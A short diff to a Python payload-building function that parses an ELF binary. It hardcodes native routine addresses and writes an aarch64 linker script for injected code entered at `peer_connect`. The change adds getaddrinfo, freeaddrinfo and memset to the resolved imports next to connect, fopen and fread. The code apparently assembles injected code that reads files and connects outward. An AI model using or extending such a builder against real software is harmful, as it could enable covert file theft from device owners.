@@ -130,7 +130,8 @@ def payload(elf, code_start, work, clang, linker, public_key):
     symbols = elf.get_section(rel['sh_link'])
     imports = {symbols.get_symbol(r['r_info_sym']).name: elf.get_section_by_name('.plt')['sh_addr'] + 32 + n * 16 for n, r in enumerate(rel.iter_relocations())}
     addresses = { 'native_hsalsa': 0x35b118, 'native_seal': 0x36bc7c, 'native_open': 0x1f8f08 }
-    for name, symbol in [('native_connect', 'connect'), ('native_fopen', 'fopen'), ('native_fread', 'fread'), ('native_fclose', 'fclose'), ('native_errno', '__errno')]:
+    addresses['memset'] = imports['memset']
+    for name, symbol in [('native_connect', 'connect'), ('native_fopen', 'fopen'), ('native_fread', 'fread'), ('native_fclose', 'fclose'), ('native_errno', '__errno'), ('native_getaddrinfo', 'getaddrinfo'), ('native_freeaddrinfo', 'freeaddrinfo')]:
         addresses[name] = imports[symbol]
     script = 'OUTPUT_ARCH(aarch64)\nENTRY(peer_connect)\nSECTIONS {\n . = ' + hex(code_start) + ';\n .text : { KEEP(*(.text.entry)) *(.text*) }\n .rodata : ALIGN(16) { *(.rodata*) }\n /DISCARD/ : { *(.comment) *(.note*) *(.eh_frame*) }\n}\n'
     script += '\n'.join(name + ' = ' + hex(address) + ';' for name, address in addresses.items())
